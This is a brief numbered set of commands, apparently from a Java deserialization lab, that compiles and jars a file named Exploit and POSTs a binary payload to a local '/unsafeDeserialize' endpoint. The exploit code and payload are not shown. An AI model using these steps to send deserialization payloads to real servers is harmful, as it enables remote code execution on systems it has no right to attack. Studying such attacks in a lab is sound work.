1. javac Exploit.java
2. jar cf Exploit.jar Exploit.class
3. ```curl -X POST \
  http://localhost:8080/unsafeDeserialize \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @payload.bin
```